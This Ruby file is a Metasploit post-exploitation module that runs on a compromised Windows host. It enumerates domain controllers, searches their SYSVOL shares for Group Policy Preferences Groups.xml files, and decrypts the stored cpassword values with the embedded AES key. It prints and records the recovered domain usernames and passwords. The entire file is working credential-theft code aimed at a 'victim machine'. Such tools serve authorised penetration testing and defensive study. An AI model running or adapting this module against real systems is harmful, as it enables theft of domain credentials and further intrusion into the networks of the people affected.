##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'rex'
require 'rexml/document'


class Metasploit3 < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::Priv


	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Gather Group Policy Preferences Saved Password Extraction',
			'Description'   => %q{
				This module enumerates Domain Controllers for any domains the
				victim machine knows about. It then connects to those DCsvia SMB 
				and looks for Group Policy Preferences XML files containing 
				local user accounts and passwords. It then aprses the XML files
				and decrypts the passwords.

				This module must be run under a domain user to work. 
			},
			'License'       => MSF_LICENSE,
			'Author'        =>['
				TheLightCosine <thelightcosine[at]gmail.com>',
				'Rob Fuller <mubix[at]hak5.org>' #domain/dc enumeration code
				],
			'References'    => 
				[
					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences']
				],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

	end

	def run
		if is_system?
			print_error "This needs to be run as a Domain User, not SYSTEM"
			return nil
		end

		dcs = []
		paths = []
		enum_domains.each do |domain|
			if domain[:domain] == "WORKGROUP"
				print_status "Skipping 'WORKGROUP'..."
				next
			end
			dcs << enum_dcs(domain[:domain])
		end

		dcs = dcs.flatten.compact
		dcs.each do |dc|
			print_status "Recusrively searching for Groups.xml on #{dc}..."
			tmpath = "\\\\#{dc}\\sysvol\\" #msflab.com\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml"
			paths << find_paths(tmpath)
		end

		paths = paths.flatten.compact
		paths.each do |path|
			get_xml(path)
		end

	end

	def find_paths(path)
		paths=[]
		session.fs.dir.foreach(path) do |sub|
			next if sub =~ /^(\.|\.\.)$/
			print_status "Looking in Domain #{sub}"
			tpath = "#{path}#{sub}\\Policies\\"
			session.fs.dir.foreach(tpath) do |sub2|
				next if sub2 =~ /^(\.|\.\.)$/
				print_status "Looking in Policy #{sub2}"
				tpath2 = "#{tpath}#{sub2}\\MACHINE\\Preferences\\Groups\\Groups.xml"
				begin
					paths << tpath2 if client.fs.file.stat(tpath2)
					print_good tpath2
				rescue 
					next
				end
			end
		end
		return paths
	end



	def get_xml(path)
		data=""
		begin
			xmlexists = client.fs.file.stat(path)
			groups = client.fs.file.new(path,'r')
			until groups.eof
				data << groups.read
			end
			domain = path.split('\\')[2]
			parse_xml(data,domain)
			print_status("Finished processing #{path}")
		rescue
			print_status("The file #{path} either could not be read or does not exist")
		end
	end

	def parse_xml(data,domain)
		mxml= REXML::Document.new(data).root
		mxml.elements.to_a("//Properties").each do |node|
			user = node.attributes['userName']
			epassword= node.attributes['cpassword']
			next if epassword == nil or epassword== ""
			padding = ( "=" * (4 - (epassword.length % 4)) )
			epassword = "#{epassword}#{padding}"
			decoded = epassword.unpack("m*")[0]
			pass=decrypt(decoded)
			print_good("DOMAIN: #{domain} USER: #{user} PASS: #{pass}")
			user= "#{domain}\\#{user}" unless domain.nil? or domain.empty?
			if session.db_record
				source_id = session.db_record.id
			else
				source_id = nil
			end
			report_auth_info(
				:host  => session,
				:port => 445,
				:sname => 'tcp',
				:source_id => source_id,
				:source_type => "exploit",
				:user => user,
				:pass => pass)
		end
	end

	def decrypt(encrypted_data)
		key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
		aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
		aes.decrypt
		aes.key = key
		aes.update(encrypted_data) + aes.final
	end

	def enum_domains
		print_status "Enumerating Domains..."
		domain_enum = 2147483648 # SV_TYPE_DOMAIN_ENUM =  hex 80000000
		buffersize = 500
		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
		print_status("Finding the right buffersize...")
		while result['return'] == 234
			print_status("Tested #{buffersize}, got #{result['entriesread']} of #{result['totalentries']}")
			buffersize = buffersize + 500
			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
		end

		count = result['totalentries']
		print_status("#{count} domain(s) found.")
		startmem = result['bufptr']

		base = 0
		domains = []
		mem = client.railgun.memread(startmem, 8*count)
		count.times{|i|
				x = {}
				x[:platform] = mem[(base + 0),4].unpack("V*")[0]
				nameptr = mem[(base + 4),4].unpack("V*")[0]
				x[:domain] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
				domains << x
				base = base + 8
			}
		return domains
	end

	def enum_dcs(domain)
		print_status("Enumerating DCs for #{domain}")
		domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
		buffersize = 500
		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
		while result['return'] == 234
			buffersize = buffersize + 500
			result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
		end
		if result['totalentries'] == 0
			print_error("No Domain Controllers found for #{domain}")
			return nil
		end

		count = result['totalentries']
		startmem = result['bufptr']

		base = 0
		mem = client.railgun.memread(startmem, 8*count)
		hostnames = []
		count.times{|i|
			t = {}
			t[:platform] = mem[(base + 0),4].unpack("V*")[0]
			nameptr = mem[(base + 4),4].unpack("V*")[0]
			t[:dc_hostname] = client.railgun.memread(nameptr,255).split("\0\0")[0].split("\0").join
			base = base + 8
			print_good "DC Found: #{t[:dc_hostname]}"
			hostnames << t[:dc_hostname]
		}
		return hostnames
	end
end
